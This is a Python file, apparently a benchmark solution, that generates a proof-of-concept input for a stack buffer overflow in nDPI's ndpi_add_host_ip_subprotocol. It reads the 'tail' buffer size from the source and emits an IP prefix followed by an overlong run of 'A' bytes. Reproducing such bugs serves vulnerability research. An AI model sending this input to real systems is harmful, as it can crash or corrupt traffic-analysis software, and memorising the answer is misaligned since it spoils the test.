import tarfile
import re

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Analyzes the source code to find the buffer size of 'tail' in 
        ndpi_add_host_ip_subprotocol, then generates a payload exceeding it.
        """
        # Default buffer size based on ground truth analysis (56 bytes PoC -> ~32-48 byte payload)
        # 32 bytes is a common power-of-2 buffer size.
        buffer_size = 32
        
        try:
            with tarfile.open(src_path, "r") as tar:
                # Find the vulnerable source file
                member = next((m for m in tar.getmembers() if m.name.endswith("src/lib/ndpi_main.c")), None)
                if member:
                    f = tar.extractfile(member)
                    content = f.read().decode('utf-8', errors='ignore')
                    
                    # Find the function definition. 
                    # Regex handles return types and multiline args.
                    func_regex = r"ndpi_add_host_ip_subprotocol\s*\([^)]*\)\s*\{"
                    func_match = re.search(func_regex, content, re.DOTALL)
                    
                    if func_match:
                        # Extract the start of the function body
                        start_idx = func_match.end()
                        snippet = content[start_idx:start_idx+2000]
                        
                        # Look for 'char tail[SIZE];' definition
                        tail_match = re.search(r"char\s+tail\s*\[\s*(\d+)\s*\]\s*;", snippet)
                        if tail_match:
                            buffer_size = int(tail_match.group(1))
        except Exception:
            # Fallback to default if source extraction/parsing fails
            pass

        # Construct the PoC input
        # Format expected: <IP_ADDRESS> <PROTOCOL_STRING>
        # The overflow happens when sscanf reads the protocol string into 'tail'
        
        ip_prefix = b"1.1.1.1 "
        
        # Calculate payload length
        # We need to exceed buffer_size to trigger ASan/Crash.
        # Adding 16 bytes ensures we cross the buffer boundary comfortably.
        # If buffer is 32 -> 32+16=48. Total len = 8+48=56 (Matches ground truth)
        payload_len = buffer_size + 16
        payload = b"A" * payload_len
        
        return ip_prefix + payload